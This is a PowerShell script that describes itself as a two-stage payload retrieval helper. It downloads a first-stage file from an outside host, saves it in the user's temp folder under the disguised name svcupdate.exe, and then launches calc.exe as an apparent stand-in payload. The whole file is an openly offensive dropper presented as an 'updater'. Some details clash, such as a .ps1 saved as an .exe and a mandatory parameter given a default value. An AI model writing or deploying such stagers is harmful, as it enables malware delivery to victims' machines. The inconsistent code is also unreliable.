<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$DownloadUrl = 'https://192.0.2.239:8443/stage1.ps1',
    [string]$LocalPath = "$env:TEMP\svcupdate.exe",
    [int]$TransferTimeout = 226
)
$ErrorActionPreference = "Stop"

function Invoke-StageDownload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$OperationResult = Invoke-StageDownload -SourceUrl $DownloadUrl -DestinationPath $LocalPath -TimeoutSec $TransferTimeout
if ($OperationResult) {
    Start-Process -FilePath "calc.exe"
}
Start-Sleep -Seconds 3
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
